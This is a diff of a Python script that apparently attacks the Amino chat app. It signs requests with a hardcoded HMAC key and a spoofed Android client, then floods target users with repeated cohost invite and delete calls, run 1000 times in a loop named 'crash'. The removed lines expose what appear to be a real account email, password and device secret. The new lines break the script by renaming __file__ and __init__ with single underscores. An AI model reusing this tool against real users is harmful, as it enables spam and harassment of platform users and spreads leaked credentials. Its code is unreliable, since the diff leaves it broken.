@@ -2,19 +2,38 @@ from concurrent.futures import ThreadPoolExecutor
 from requests import get
 from hashlib import sha1
 from os import path
+import colorama
+import pyfiglet
 import json, time
 import aiohttp
 import asyncio 
 import base64
 import hmac
 
-THIS_FOLDER = path.dirname(path.abspath(__file__))
-targets = path.join(THIS_FOLDER, 'Target.txt')
+THIS_FOLDER = path.dirname(path.abspath(_file_))
+targets = path.join(THIS_FOLDER, 'targets.txt')
 with open(targets, 'r') as file:
     targetlinks = file.read().splitlines()
 
+colorama.init()
+print(colorama.Fore.RED)
+print(colorama.Style.BRIGHT)
+f = pyfiglet.Figlet(font='slant')
+print (f.renderText('Vicious'))
+f = pyfiglet.Figlet(font='slant')
+print (f.renderText('Golu'))
+f = pyfiglet.Figlet(font='digital')
+print (f.renderText('Invite Cohost'))
+
+print("""Hello Im Vicious use only golu 
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+""")
+dec = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'  
+
 class FromLink:
-    def __init__(self, data):
+    def _init_(self, data):
         self.json = data
         self.objectType = None
 
@@ -46,7 +65,7 @@ class FromLink:
 
 
 class Account():
-    def __init__(self, accountline, session):
+    def _init_(self, accountline, session):
         self.authenticated = False
         self.email = accountline["email"]
         self.password = accountline["password"]
@@ -65,7 +84,7 @@ class Account():
             'Accept-Language': 'en-US',
             'Content-Type': 'text/html',
             'User-Agent':
-            'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/star2ltexx-user 7.1.; com.narvii.amino.master/3.4.33602)',
+            'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QQ3A.200805.001; com.narvii.amino.master/3.4.33585)',
             'Host': 'service.narvii.com',
             'Accept-Encoding': 'gzip',
             'Connection': 'Keep-Alive'
@@ -82,8 +101,8 @@ class Account():
 
     async def sig(self, data):
         signature = base64.b64encode(
-            bytes.fromhex("52") +
-            hmac.new(bytes.fromhex("EAB4F1B9E3340CD1631EDE3B587CC3EBEDF1AFA9"),
+            bytes.fromhex("19") +
+            hmac.new(bytes.fromhex("dfa5ed192dda6e88a12fe12130dc6206b1251e44"),
                      data.encode("utf-8"), sha1).digest()).decode("utf-8")
         return signature
 
@@ -163,7 +182,7 @@ class Account():
         try:
             await self.set(uid)
             await self.dele(uid)
-            print(f"Spamming {uid}")
+            print(f"Cohost Invite... {uid}")
         except Exception as e:
             print(f"error {e}")
 
@@ -172,7 +191,7 @@ async def itachi(acc: Account):
     crowd = []
     xo = len(acc.target_user)
     # for _ in range(10):
-    with ThreadPoolExecutor(max_workers= 50000) as exe:
+    with ThreadPoolExecutor(max_workers= 150) as exe:
         _ = [
             exe.submit(
                 crowd.append(
@@ -184,10 +203,10 @@ async def itachi(acc: Account):
 
 async def main():
     
-    email="Rahulggpro607@gmail.com" # enter email here
-    password="Rahul@8826" # enter password here
-    device="19EFD2929325DFE4B5437399BADFF2C918E53FC8635C18110764AA0A37D2084D5689E0B300A0CF892F" # enter secret here
-    gclink="http://aminoapps.com/p/ae3kpq"  # enter gc link where you are set as host
+    email="" # enter email here
+    password="8761" # enter password here
+    device="" # enter secret here
+    gclink="http://aminoapps.com/p/249m52"  # enter gc link where you are set as host
     logdata = {"email": email, "password": password, "device": device}
     async with aiohttp.ClientSession() as session:
         client = Account(logdata, session)
@@ -201,7 +220,7 @@ async def main():
              task = []
              print(task)
              await itachi(client)
-             for _ in range(100):
+             for _ in range(1000):
                  for uid in client.target_user:
                      task.append(asyncio.create_task(client.crash(uid)))
              await asyncio.gather(*task)
